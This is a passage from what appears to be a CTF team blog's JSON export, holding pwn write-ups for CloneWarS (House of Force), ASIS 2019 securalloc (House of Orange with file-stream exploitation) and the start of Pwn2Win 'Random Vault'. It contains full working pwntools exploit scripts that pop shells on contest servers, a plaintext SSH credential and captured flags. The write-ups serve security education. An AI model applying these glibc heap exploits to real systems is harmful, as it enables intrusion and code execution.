the current heap arena, this chunk is located at the top of the heap.On this sample program we can see right after the first allocation the heap is initialized, the first chunk is the tc ache_p_struct next is the allocated chunk by us.Finally right at the top of the heap we have the wilderness the space left in the arena is defined in the field mchunk_size so lets see what happens when we allocate a 2nd chunk:When it exceeds the space left, heap expansion is triggered mapping a new memory page. So what happens when the top chunk is used to allocate the size of the heap block to any value controlled by the user? The answer is that you can make the top chunk point to whatever we want (yes everywhere even in a position before because of overflow), which is equivalent to an arbitrary address write. However, in glibc, the size of the user request and the existing size of the top chunk are verified. 123456789101112131415161718192021222324252627282930313233343536Void_t*_int_malloc(mstate av, size_t bytes) &#123; INTERNAL_SIZE_T nb; /* normalized request size */ [...] mchunkptr victim; /* inspected/selected chunk */ INTERNAL_SIZE_T size; /* its size */ int victim_index; /* its bin index */ mchunkptr remainder; /* remainder from a split */ unsigned long remainder_size; /* its size */ [...] checked_request2size(bytes, nb); [...] /* finally, do the allocation */ p = av-&gt;top; size = chunksize (p); /* check that one of the above allocation paths succeeded */ if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)) &#123; remainder_size = size - nb; remainder = chunk_at_offset (p, nb); av-&gt;top = remainder; set_head (p, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); set_head (remainder, remainder_size | PREV_INUSE); check_malloced_chunk (av, p, nb); return chunk2mem (p); &#125; [...]&#125; Perhaps, if you can override with size to a large value, you can easily pass this verification, we can do this with an overflow vulnerability to tamper the top_chunk size. 1(unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE) In the Malloc Maleficarum it is written that the wilderness chunk should have the highest size possible (preferably 0xFFFFFFFFFFFFFFFF) which is the largest number in unsigned long in x64. 12345/* Treat space at ptr + offset as a chunk */#define chunk_at_offset(p, s) ((mchunkptr) (((char *) (p)) + (s)))remainder = chunk_at_offset (p, nb);av-&gt;top = remainder; After that, the top pointer will be updated, and the next heap block will be allocated to this location. Writing the exploitThe first thing is find a way to connect with SSH to connect to the server I did that with: 12r =process(\"sshpass -p 12345678 ssh -p 7000 -tt yeet@ctf2.kaf.sh\".split())r.interactive() You need to have sshpass installed tho and also you need to add the server ip to the known hosts before which can be done by saying yes while connecting for the first time via command line: 1$ ssh -p 7000 yeet@ctf2.kaf.sh First we need to get a HEAP address leak we can get this by executing R2D2 option: 1234567891011121314def r2d2(n): r.sendlineafter('Your choice: ', '2') r.sendlineafter('R2? ', '2')def pstarships(size, kind, capacity): r.sendlineafter('Your choice: ', '3') r.sendlineafter('Master, the amount of starships: ', str(size)) r.sendlineafter('What kind of starships?: ', kind) r.sendlineafter('Capacity of troopers in the starships: ', str(capacity))r = getConn()pstarships(0x30, 'A', 0x30)r2d2(-1)r.recvuntil('R2D2 IS .... ')HEAP_L = int(r.recvregex(r'(\\d+) ')) Next step is to tamper the size of the wilderness with pstartships via memset: 12# OVERFLOW TOP_CHUNKpstarships(0x30, \"FF\", 0x40) # Overflow Top Chunk The top_chunk before overflow:The top_chunk after overflow:Now the place we want to write is at FILE global string pointer we can do this by going to the darkside(cm2_dark_side): 12345# LEAK FILE PTRr.sendlineafter('Your choice: ', '6')r.recvuntil('File is at: ')FILE = int(r.recvline().rstrip())log.info(\"FILE ADDR 0x%x\" % FILE) Now we calculate the evilsize required to write at FILE can be done with FILE-TOP_CHUNK-8*4: 123456HEAP = HEAP_L-0x1380 # HEAPBASESIZE_OF_LONG = 0x8 # sizeof(long) -&gt; 8 in 64 bitsWILD_OFFSET = 0x12e0 # Current TOP_CHUNK offsetTOP_CHUNK = HEAP+WILD_OFFSET+SIZE_OF_LONG*4r.sendlineafter('Your choice: ', '1')buildDeathStar(FILE-TOP_CHUNK) # Malloc will return an arbitrary pointer to FILE To calculate WILD_OFFSET you can put a break point right before malloc inside buildDeathStar and calculate with this:Write sh into file: 1234r.sendlineafter('Your choice: ', '4')r.sendlineafter('What kind of troopers?: ', 'sh') # Modify file with shr.sendlineafter('Your choice: ', '6') # Trigger system(\"sh\")r.interactive() The full exploit: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273from pwn import *filename = \"./CloneWarS\"elf = ELF(filename)context.arch = 'amd64'def getConn(): return process(filename) if not args.REMOTE else process(\"sshpass -p 12345678 ssh -p 7000 -tt yeet@ctf2.kaf.sh\".split())def get_PIE(proc): memory_map = open(\"/proc/&#123;&#125;/maps\".format(proc.pid),\"rb\").readlines() return int(memory_map[0].split(\"-\")[0],16)def debug(bp): script = \"\" PIE = get_PIE(r) PAPA = PIE for x in bp: script += \"b *0x%x\\n\"%(PIE+x) gdb.attach(r,gdbscript=script)def r2d2(n): r.sendlineafter('Your choice: ', '2') r.sendlineafter('R2? ', '2')def pstarships(size, kind, capacity): r.sendlineafter('Your choice: ', '3') r.sendlineafter('Master, the amount of starships: ', str(size)) r.sendlineafter('What kind of starships?: ', kind) r.sendlineafter('Capacity of troopers in the starships: ', str(capacity))def lightsabers(nLs, color): r.sendlineafter('Your choice: ', '5') r.sendafter('How many lightsabers do you think you will need?: ', '\\n') r.sendline(str(nLs)) r.sendafter('What color would you like on your light sabers: ', color)def buildDeathStar(size): r.sendlineafter('Your choice: ', '1') r.sendlineafter('Assemble death star: ',str(size)) context.terminal = ['tmux', 'new-window']r = getConn()# LEAKING HEAPpstarships(0x30, 'A', 0x30)r2d2(-1)r.recvuntil('R2D2 IS .... ')HEAP_L = int(r.recvregex(r'(\\d+) '))log.info('HEAP ADDR 0x%x'% HEAP_L)if not args.REMOTE and args.GDB: debug([0xB0F,0xC3C,0xA7D, 0xE00]) # 0xD94# OVERFLOW TOP_CHUNKpstarships(0x30, \"FF\", 0x40) # Overflow Top Chunk# LEAK FILE PTRr.sendlineafter('Your choice: ', '6')r.recvuntil('File is at: ')FILE = int(r.recvline().rstrip())log.info(\"FILE ADDR 0x%x\" % FILE)HEAP = HEAP_L-0x1380 # HEAPBASESIZE_OF_LONG = 0x8 # sizeof(long) -&gt; 8 in 64 bitsWILD_OFFSET = 0x12e0 # Current TOP_CHUNK offsetTOP_CHUNK = HEAP+WILD_OFFSET+SIZE_OF_LONG*4r.sendlineafter('Your choice: ', '1')buildDeathStar(FILE-TOP_CHUNK) # Calculate the evil size required to write to FILEr.sendlineafter('Your choice: ', '4')r.sendlineafter('What kind of troopers?: ', 'sh') # Modify file with shr.sendlineafter('Your choice: ', '6') # Trigger system(\"sh\")r.interactive()r.close() Running it: 1234567891011121314$ python CloneWarS.py REMOTE[+] Starting local process '/usr/bin/sshpass': pid 113679[*] HEAP ADDR 0x555555757780[*] FILE ADDR 0x555555756010[*] Switching to interactive mode6File is at: 93824994336784$ $ lslsbinary flag.txt skywalker.txt$ $ cat flag.txtcat flag.txtKAF&#123;MaY_tHe_F0RCE_B3_W1tH_YOUUU10293012884&#125; References gbmaster ctfwiki how2heap","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://teamrocketist.github.io/categories/Pwn/"},{"name":"x64","slug":"Pwn/x64","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/"},{"name":"Glibc Malloc","slug":"Pwn/x64/Glibc-Malloc","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/"},{"name":"House of Force","slug":"Pwn/x64/Glibc-Malloc/House-of-Force","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/House-of-Force/"},{"name":"Heap Overflow","slug":"Pwn/x64/Heap-Overflow","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Heap-Overflow/"}],"tags":[{"name":"heap_overflow","slug":"heap-overflow","permalink":"https://teamrocketist.github.io/tags/heap-overflow/"},{"name":"kidpod2019","slug":"kidpod2019","permalink":"https://teamrocketist.github.io/tags/kidpod2019/"}]},{"title":"[Pwn] Asis Finals 2019 - securalloc","slug":"Pwn-Asis-Finals-2019-securalloc","date":"2019-11-18T03:01:32.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2019/11/18/Pwn-Asis-Finals-2019-securalloc/","link":"","permalink":"https://teamrocketist.github.io/2019/11/18/Pwn-Asis-Finals-2019-securalloc/","excerpt":"","text":"Securalloc Points167Solves26CategoryWarm-up Pwnable Description: The key to success in the battlefield is always the secure allocation of resources! nc 76.74.177.238 9001libc.so.6libsalloc.sosecuralloc.elf TLDR Leak libc from _IO_2_1_stderr leftover Leak heap from _IO_2_1_stderr leftover Leak heap canary from /dev/random leftover Apply House of Orange and get a shell. Extract informationWe have an extra shared library libsalloc.so to analyse but first lets check the security on securalloc.elf: 1234567$ checksec securalloc.elf[*] '/ctf/asis2019/pwn/securalloc/securalloc.elf' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled Full RELRO is enabled so GOT is read only this is something that we always should take in mind before proceeding any further. Identifying the vulnerabilityNow lets check for a vulnerability : Elf analysisLike other heap challenges we will have the classic functions print, create, delete and edit but this time we have an additional shared library named libsalloc.so and the functions used from it are: secureinit Opening libsalloc.so in ida we can see it uses fopen to open /dev/urandom to create a canary: And why this is bad ? Looking at fopen internals:123456789101112131415161718192021222324252627FILE *__fopen_internal (const char *filename, const char *mode, int is32)&#123; struct locked_FILE &#123; struct _IO_FILE_plus fp;#ifdef _IO_MTSAFE_IO _IO_lock_t lock;#endif struct _IO_wide_data wd; &#125; *new_f = (struct locked_FILE *) malloc (sizeof (struct locked_FILE)); // malloc call here if (new_f == NULL) return NULL;#ifdef _IO_MTSAFE_IO new_f-&gt;fp.file._lock = &amp;new_f-&gt;lock;#endif _IO_no_init (&amp;new_f-&gt;fp.file, 0, 0, &amp;new_f-&gt;wd, &amp;_IO_wfile_jumps); _IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps; _IO_new_file_init_internal (&amp;new_f-&gt;fp); if (_IO_file_fopen ((FILE *) new_f, filename, mode, is32) != NULL) return __fopen_maybe_mmap (&amp;new_f-&gt;fp.file); _IO_un_link (&amp;new_f-&gt;fp); free (new_f); // free call here return NULL;&#125; So a malloc of struct locked_FILE is executed, this struct will store IO_FILE pointers and the /dev/urandom data. struct _IO_FILE_plus 12345678910/* We always allocate an extra word following an _IO_FILE. This contains a pointer to the function jump table used. This is for compatibility with C++ streambuf; the word can be used to smash to a pointer to a virtual function table. */struct _IO_FILE_plus&#123; FILE file; const struct _IO_jump_t *vtable;&#125;; Look in memory after running fopen:struct _IO_wide_data12345678910111213141516171819202122232425/* Extra data for wide character streams. */struct _IO_wide_data&#123; wchar_t *_IO_read_ptr; /* Current read pointer */ wchar_t *_IO_read_end; /* End of get area. */ wchar_t *_IO_read_base; /* Start of putback+get area. */ wchar_t *_IO_write_base; /* Start of put area. */ wchar_t *_IO_write_ptr; /* Current put pointer. */ wchar_t *_IO_write_end; /* End of put area. */ wchar_t *_IO_buf_base; /* Start of reserve area. */ wchar_t *_IO_buf_end; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ wchar_t *_IO_save_base; /* Pointer to start of non-current get area. */ wchar_t *_IO_backup_base; /* Pointer to first valid character of backup area */ wchar_t *_IO_save_end; /* Pointer to end of non-current get area. */ __mbstate_t _IO_state; __mbstate_t _IO_last_state; struct _IO_codecvt _codecvt; wchar_t _shortbuf[1]; const struct _IO_jump_t *_wide_vtable;&#125;; The look in memory:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105pwndbg&gt; p *((_IO_lock_t*)0x000055dc452ed0f0) [33/1706]$15 = &#123; lock = 0, cnt = 0, owner = 0x0&#125;pwndbg&gt; p *((struct _IO_wide_data*)0x55dc452ed100)$16 = &#123; _IO_read_ptr = 0x0, _IO_read_end = 0x0, _IO_read_base = 0x0, _IO_write_base = 0x0, _IO_write_ptr = 0x0, _IO_write_end = 0x0, _IO_buf_base = 0x0, _IO_buf_end = 0x0, _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _IO_state = &#123; __count = 0, __value = &#123; __wch = 0, __wchb = &quot;\\000\\000\\000&quot; &#125; &#125;, _IO_last_state = &#123; __count = 0, __value = &#123; __wch = 0, __wchb = &quot;\\000\\000\\000&quot; &#125; &#125;, _codecvt = &#123; __codecvt_destr = 0x0, __codecvt_do_out = 0x0, __codecvt_do_unshift = 0x0, __codecvt_do_in = 0x0, __codecvt_do_encoding = 0x0, __codecvt_do_always_noconv = 0x0, __codecvt_do_length = 0x0, __codecvt_do_max_length = 0x0, __cd_in = &#123; __cd = &#123; __nsteps = 0, __steps = 0x0, __data = 0x55dc452ed1b8 &#125;, __combined = &#123; __cd = &#123; __nsteps = 0, __steps = 0x0, __data = 0x55dc452ed1b8 &#125;, __data = &#123; __outbuf = 0x0, __outbufend = 0x0, __flags = 0, __invocation_counter = 0, __internal_use = 0, __statep = 0x0, __state = &#123; __count = 0, __value = &#123; __wch = 0, __wchb = &quot;\\000\\000\\000&quot; &#125; &#125; &#125; &#125; &#125;, __cd_out = &#123; __cd = &#123; __nsteps = 0, __steps = 0x0, __data = 0x55dc452ed1f8 &#125;, __combined = &#123; __cd = &#123; __nsteps = 0, __steps = 0x0, __data = 0x55dc452ed1f8 &#125;, __data = &#123; __outbuf = 0x0, __outbufend = 0x0, __flags = 0, __invocation_counter = 0, __internal_use = 0, __statep = 0x0, __state = &#123; __count = 0, __value = &#123; __wch = 0, __wchb = &quot;\\000\\000\\000&quot; &#125; &#125; &#125; &#125; &#125; &#125;, _shortbuf = L&quot;&quot;, _wide_vtable = 0x7fb6d6371260 &lt;_IO_wfile_jumps&gt;&#125; The /dev/urandom data:This data is freed but not cleared which means later we can leak this data by overlapping new chunks and use the print function to leak libc, heap and even the heap canary created by this library. securealloc securealloc adds 0x10 more bytes to the allocated space to store a canary at the end of the chunk and the size at the beginning: 123456789101112_DWORD *__fastcall secure_malloc(unsigned int size)&#123; _DWORD *v2; // [rsp+18h] [rbp-8h] v2 = malloc(size + 0x10); // integer overflow here btw :) if ( !v2 ) __abort((__int64)\"Resource depletion (secure_malloc)\"); *v2 = size; v2[1] = size + 1; *(_QWORD *)((char *)v2 + size + 8) = canary; return v2 + 2;&#125; There is an integer overflow at malloc(size + 0x10) this could also be used to bypass the canary unfortunately the canary is going to be stored at a very high heap address which is unmapped we would have to expand the heap multiple times to get a mappable address, while this is feasible to do it locally it isn’t remotely because while there is a limit restriction of memory on the server we also would take 1 or 2 hours to do it (because we are communicating remotely). securefree There is a double free verification and also wipes out the chunk data before freeing.1234567891011121314void __fastcall secure_free(__int64 a1)&#123; int v1; // [rsp+18h] [rbp-8h] if ( a1 ) &#123; v1 = *(_DWORD *)(a1 - 8); if ( *(_DWORD *)(a1 - 4) - v1 != 1 ) __abort((__int64)\"*** double free detected ***: &lt;unknown&gt; terminated\"); __heap_chk_fail(a1); memset((void *)(a1 - 8), 0, (unsigned int)(v1 + 16)); free((void *)(a1 - 8)); &#125;&#125;. _heap_chk_fail this the function that verifies if there is a heap overflow. 123456789101112131415161718__int64 __fastcall _heap_chk_fail(__int64 a1)&#123; __int64 result; // rax unsigned int v2; // [rsp+10h] [rbp-10h] if ( a1 ) &#123; v2 = *(_DWORD *)(a1 - 8); result = *(_DWORD *)(a1 - 4) - v2; if ( (_DWORD)result == 1 ) &#123; result = canary; if ( *(_QWORD *)(v2 + a1) != canary ) __abort((__int64)\"*** heap smashing detected ***: &lt;unknown&gt; terminated\"); &#125; &#125; return result;&#125; LEAK heap and libc addressThis the looks of the memory after secure_init: To leak both we can first allocate a chunk of 0x60 and then 0x30 (this one leaks heap) and then 0x10 (this one will leak IO_JUMP libc address). The python code to do this: 12345678910111213141516171819202122add(0x60) # this one is freed for a reason this will be explained laterdelete()add(0x30)show()r.recvuntil('Data: ')HEAPADDR = u64(r.recv(6).ljust(0x8,'\\x00'))HEAP = HEAPADDR - 0xf0log.info(\"HEAPADDR 0x%x\" % HEAPADDR)log.info(\"HEAP 0x%x\" % HEAP)add(0x10)show()r.recvuntil('Data: ')IOFILEJUMPS = u64(r.recv(6).ljust(0x8,'\\x00')) # _IO_file_jumpsLIBC = IOFILEJUMPS - libc.symbols['_IO_file_jumps']_IO_LIST_ALL = LIBC + libc.symbols['_IO_list_all']SYSTEM = LIBC + libc.symbols['system']log.info(\"IO_file_jumps 0x%x\" % IOFILEJUMPS)log.info(\"LIBC 0x%x\" % LIBC) Leak canaryThe canary is located at /dev/urandom data: We do the same thing by allocating first a chunk of data 0x140 and then 0x8: 123456# leak heap canary (/dev/urandom buffer)add(0x140)add(0x8)show()HEAPCANARY = u64(r.recvline().rstrip()[-7::].rjust(0x8,'\\x00'))log.info(\"HEAPCANARY 0x%x\" % HEAPCANARY) House of OrangeThis isn’t exactly house of orange, house of orange usually is used when there isn’t a possibility of using a free by forcing the heap to expand by triggering sysmalloc when the top_chunk has no more space to allocate freeing the topchunk… In our case we just want to convert the freed 0x60 sized chunk we freed previously into a smallbin. When there is a large request(largebin size is enough) of malloc, a consolidation happens in order to prevent fragmentation. Every fastbin is moved to the unsortedbin, consolidates if possible, and finally goes to smallbin. Later we use an unsortedbin attack with File Stream Oriented Programming to get a system(‘/bin/sh’) shell. So this is the moment right before we allocate a chunk of 0x3e0 (0x3e0+0x10 &gt; 1000 in decimal):Now after executing malloc this fastbin chunk will be transformed into a smallbin: File Stream Oriented ProgrammingWe know that ROP can be used to hijack the control flow of the program, this can also be achieved by using file stream oriented programming but this one is achieved through an attack at File Stream. We need to first understand malloc error message, which malloc_printerr is the function used to print the error: 1234567if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))&#123; errstr = \"malloc(): memory corruption (fast)\"; errout: malloc_printerr (check_action, errstr, chunk2mem (victim), av); return NULL;&#125; the function is calls __libc_message after the abort function is called. The structure inside is used here, and the method of calling the virtual table is triggered. abort -&gt; _IO_flush_all_lockp -&gt; _IO_list_all We can use the heap overflow to change the smallbin bk and implement the unsortbin attack, bk address should point to _IO_list_all -0x10 so we can corrupt _IO_list_all. In the end the unsortedbin attack will change the pointer of _IO_list_all into a location in main_arena, which will make _chain pointer of _IO_list_all to a fake IO_FILE (This fake IO_FILE will be located in heap). Here is how _IO_list_all looks in memory: 1234567891011121314151617181920212223242526272829303132333435pwndbg&gt; p *((struct _IO_FILE_plus*)0x7f742fb8db78)$13 = &#123; file = &#123; _flags = 0xf12befc0, _IO_read_ptr = 0x559af129d4f0 &quot;&quot;, _IO_read_end = 0x559af129d4f0 &quot;&quot;, _IO_read_base = 0x7f742fb8e510 &quot;&quot;, _IO_write_base = 0x7f742fb8db88 &lt;main_arena+104&gt; &quot;\\360\\324)\\361\\232U&quot;, _IO_write_ptr = 0x7f742fb8db88 &lt;main_arena+104&gt; &quot;\\360\\324)\\361\\232U&quot;, _IO_write_end = 0x7f742fb8db98 &lt;main_arena+120&gt; &quot;\\210?/t\\177&quot;, _IO_buf_base = 0x7f742fb8db98 &lt;main_arena+120&gt; &quot;\\210?/t\\177&quot;, _IO_buf_end = 0x7f742fb8dba8 &lt;main_arena+136&gt; &quot;\\230?/t\\177&quot;, _IO_save_base = 0x7f742fb8dba8 &lt;main_arena+136&gt; &quot;\\230?/t\\177&quot;, _IO_backup_base = 0x7f742fb8dbb8 &lt;main_arena+152&gt; &quot;\\250?/t\\177&quot;, _IO_save_end = 0x7f742fb8dbb8 &lt;main_arena+152&gt; &quot;\\250?/t\\177&quot;, _markers = 0x7f742fb8dbc8 &lt;main_arena+168&gt;, _chain = 0x7f742fb8dbc8 &lt;main_arena+168&gt;, _fileno = 0x2fb8dbd8, _flags2 = 0x7f74, _old_offset = 0x7f742fb8dbd8, _cur_column = 0xdbe8, _vtable_offset = 0xb8, _shortbuf = &quot;/&quot;, _lock = 0x7f742fb8dbe8 &lt;main_arena+200&gt;, _offset = 0x7f742fb8dbf8, _codecvt = 0x7f742fb8dbf8 &lt;main_arena+216&gt;, _wide_data = 0x7f742fb8dc08 &lt;main_arena+232&gt;, _freeres_list = 0x7f742fb8dc08 &lt;main_arena+232&gt;, _freeres_buf = 0x7f742fb8dc18 &lt;main_arena+248&gt;, __pad5 = 0x7f742fb8dc18, _mode = 0x2fb8dc28, _unused2 = &quot;t\\177\\000\\000(?/t\\177\\000\\000\\070?/t&quot;... &#125;, vtable = 0x7f742fb8dc38 &lt;main_arena+280&gt;&#125; We need to forge an IO file that meets some specifications: 12345if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base) || (_IO_vtable_offset (fp) == 0 &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)) ) &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF) Also need to change vtable address to a place we can control in this case I used a place on the heap. We need then the _IO_OVERFLOW pointer to be setted to system, the fp header is set to /bin/sh. we first allocate a chunk of size 0x0 but with the summation of securealloc the size will be 0x0+0x10 =0x10, this will create a small chunk and it’s going to be allocated in the space of the first chunk we freed taking up 0x10 of it’s space, and create a new unsortedbin as we can see below:This is the payload we want to use: 123456789101112payload = p64(HEAPCANARY) # rewrite canary to avoid security triggerpayload += \"/bin/sh\\x00\" # fp header is set to **/bin/sh**payload += p64(0x61) # chunk sizepayload += p64(0xdeadbeef) # FD flags fieldpayload += p64(_IO_LIST_ALL-0x10) # BK point where we want to writepayload += p64(0) + p64(1) #_IO_write_base &lt; _IO_write_ptrpayload += p64(0) * 18 # from _IO_read_ptr to __pad5payload += p64(0) # fp-&gt;_mode &lt;= 0payload += p64(0) * 2 # unusedpayload += p64(HEAP+0x100) # VTABLE ADDRESSpayload += p64(0) * 3 #OUR VTABLE starts here which is located at HEAPBASE+0x100payload += p64(SYSTEM) # _IO_OVERFLOW overwritten with system Creating the chunks: 123add(0x0) # create 0x21 chunkedit(payload) # overflow 0x21 chunkadd(0x10) # trigger _IO_OVERFLOW aka system('/bin/sh') The data after the overflow:The exploit is not very reliable and sometimes fails so I putted it in an infinite loop to avoid rerunning the script at failurers: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123from pwn import *host, port = \"76.74.177.238\", \"9001\"filename = \"./securalloc.elf\"elf = ELF(filename)context.arch = 'amd64'if not args.REMOTE: libc = elf.libc # get a docker container that runs libc-2.23 or LD_PRELOADelse: libc = ELF('./libc.so.6')def getConn(): return process(filename) if not args.REMOTE else remote(host, port)def get_PIE(proc): memory_map = open(\"/proc/&#123;&#125;/maps\".format(proc.pid),\"rb\").readlines() return int(memory_map[0].split(\"-\")[0],16)def get_LIBC(proc): memory_map = open(\"/proc/&#123;&#125;/maps\".format(proc.pid),\"rb\").readlines() return int(memory_map[4].split(\"-\")[0],16)def get_LIBALLOC(proc): memory_map = open(\"/proc/&#123;&#125;/maps\".format(proc.pid),\"rb\").readlines() return int(memory_map[9].split(\"-\")[0],16)def debug(bp, labp=[]): script = \"\" PIE = get_PIE(r) LIBALLOC = get_LIBALLOC(r) for x in bp: script += \"b *0x%x\\n\"%(PIE+x) for x in labp: script += \"b *0x%x\\n\"%(LIBALLOC+x) gdb.attach(r,gdbscript=script)def add(size): r.sendlineafter('==========\\n&gt; ', '1') r.sendlineafter('Size: ', str(size))def edit(data): r.sendlineafter('==========\\n&gt; ', '2') r.sendlineafter('Data: ', data)def show(): r.sendlineafter('==========\\n&gt; ', '3')def delete(): r.sendlineafter('==========\\n&gt; ', '4')context.terminal = ['tmux', 'new-window']def exploit(): try: global r r = getConn() # leak libc and heap (_IO_2_1_stderr) if not args.REMOTE and args.GDB: debug([0xBFF,0xC67,0xC7D,0xC39,0xD45,0xB6E], [0xA0B]) add(0x60) delete() add(0x30) show() r.recvuntil('Data: ') HEAPADDR = u64(r.recv(6).ljust(0x8,'\\x00')) HEAP = HEAPADDR - 0xf0 log.info(\"HEAPADDR 0x%x\" % HEAPADDR) log.info(\"HEAP 0x%x\" % HEAP) add(0x10) show() r.recvuntil('Data: ') IOFILEJUMPS = u64(r.recv(6).ljust(0x8,'\\x00')) # _IO_file_jumps LIBC = IOFILEJUMPS - libc.symbols['_IO_file_jumps'] _IO_LIST_ALL = LIBC + libc.symbols['_IO_list_all'] SYSTEM = LIBC + libc.symbols['system'] log.info(\"IO_file_jumps 0x%x\" % IOFILEJUMPS) log.info(\"LIBC 0x%x\" % LIBC) # leak heap canary (/dev/urandom buffer) add(0x140) add(0x8) show() HEAPCANARY = u64(r.recvline().rstrip()[-7::].rjust(0x8,'\\x00')) log.info(\"HEAPCANARY 0x%x\" % HEAPCANARY) # 3) HOUSE OF ORANGE add(0x3e0) # fastbin(0x80) goes to a smallbin because allocation is &gt; 1000 (0x3e0+0x10 = 1008) payload = p64(HEAPCANARY) payload += \"/bin/sh\\x00\" payload += p64(0x61) #size payload += p64(0xdeadbeef) # FD payload += p64(_IO_LIST_ALL-0x10) # BK payload += p64(0) + p64(1) #_IO_write_base &lt; _IO_write_ptr payload += p64(0) * 18 # unused payload += p64(0) # fp-&gt;_mode &lt;= 0 payload += p64(0) * 2 # unused payload += p64(HEAP+0x100) # VTABLE ADDRESS payload += p64(0) * 3 #VTABLE payload += p64(SYSTEM) add(0x0) edit(payload) add(0x10) r.recvuntil('[vdso]\\n') r.sendline('ls -ltah') # send ls command r.recvline_regex(r'\\d\\d:\\d\\d\\s\\.') # to check if ls ran succefully r.interactive() r.close() return True except EOFError, KeyboardInterrupt: r.close() return Falsewhile not exploit(): pass Running it:12345678910111213141516171819202122232425262728293031323334353637383940$ python securalloc.py REMOTE[*] '/ctf/work/pwn/securalloc/securalloc.elf' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled[*] '/ctf/work/pwn/securalloc/libc.so.6' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled[+] Opening connection to 76.74.177.238 on port 9001: Done[*] HEAPADDR 0x565285b230f0[*] HEAP 0x565285b23000[*] IO_file_jumps 0x7f1728c6b6e0[*] LIBC 0x7f17288a8000[*] HEAPCANARY 0x1ecb79a1e3203a00[*] Closed connection to 76.74.177.238 port 9001[+] Opening connection to 76.74.177.238 on port 9001: Done[*] HEAPADDR 0x5643a10cb0f0[*] HEAP 0x5643a10cb000[*] IO_file_jumps 0x7fde0d99b6e0[*] LIBC 0x7fde0d5d8000[*] HEAPCANARY 0x816203195eb4af00[*] Closed connection to 76.74.177.238 port 9001[+] Opening connection to 76.74.177.238 on port 9001: Done[*] HEAPADDR 0x55e2209950f0[*] HEAP 0x55e220995000[*] IO_file_jumps 0x7effb1b836e0[*] LIBC 0x7effb17c0000[*] HEAPCANARY 0xda7a7dfc7356dd00[*] Switching to interactive modedrwxr-xr-x 1 root root 4.0K Nov 13 12:35 ..-r--r----- 1 root pwn 33 Aug 22 10:26 flag.txt-r-xr-x--- 1 root pwn 10K Aug 22 09:08 chall-r-xr-x--- 1 root pwn 37 Aug 22 05:02 redir.sh$ cat flag.txtASIS&#123;l3ft0v3r_ru1n3d_3v3ryth1ng&#125;","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://teamrocketist.github.io/categories/Pwn/"},{"name":"x64","slug":"Pwn/x64","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/"},{"name":"Glibc Malloc","slug":"Pwn/x64/Glibc-Malloc","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/"},{"name":"IO_FILE","slug":"Pwn/x64/Glibc-Malloc/IO-FILE","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/IO-FILE/"},{"name":"House of Orange","slug":"Pwn/x64/Glibc-Malloc/House-of-Orange","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/House-of-Orange/"}],"tags":[{"name":"io_file","slug":"io-file","permalink":"https://teamrocketist.github.io/tags/io-file/"},{"name":"io_file_struct","slug":"io-file-struct","permalink":"https://teamrocketist.github.io/tags/io-file-struct/"},{"name":"houseoforange","slug":"houseoforange","permalink":"https://teamrocketist.github.io/tags/houseoforange/"},{"name":"asisfinals2019","slug":"asisfinals2019","permalink":"https://teamrocketist.github.io/tags/asisfinals2019/"}]},{"title":"[Pwn] Pwn2Win 2019 CTF - Random Vault","slug":"Pwn-Pwn2Win-2019-CTF-Random-Vault","date":"2019-11-11T05:44:54.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2019/11/11/Pwn-Pwn2Win-2019-CTF-Random-Vault/","link":"","permalink":"https://teamrocketist.github.io/2019/11/11/Pwn-Pwn2Win-2019-CTF-Random-Vault/","excerpt":"","text":"Random Vault 303 points Description: While analysing data obtained through our cyber operations, our analysts have discovered an old service in HARPAinfrastructure. This service has been used to store the agency’s secrets, but it has been replaced by a moresophisticated one after a few years. By mistake, this service remained available on Internet until December 2019,when HARPA agents realized this flaw and took it down. We suspect this service is vulnerable. We need your help toexploit its vulnerability and extract the secrets that are still kept on the server.random_vault Fast Solution Use 1st format string to leak pie address Use 2nd format string to modify Seed and QWORD_5000 to shellcode place. Use shell codes jumps to manage to execute read syscall and write shellcode from the stdin. Identifying the vulnerabilityFirst thing to do is the check the security settings enabled: 1234567$ checksec random_vault[*] '/ctf/pwn/RandomVault/random_vault' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled Full RELRO is enabled so the global offset table is read only which is a thing we need to take into consideration on this challenge. Also PIE is enabled too this means if we require to get an address of a function or a pointer to a specific address of the program we will need to get a leak to calculate the PIE base. We can easily find a vulnerability in the username field:Unfortunately we can only use twice, one when the program starts and one username change: qword_4020 is set to a very large negative number, 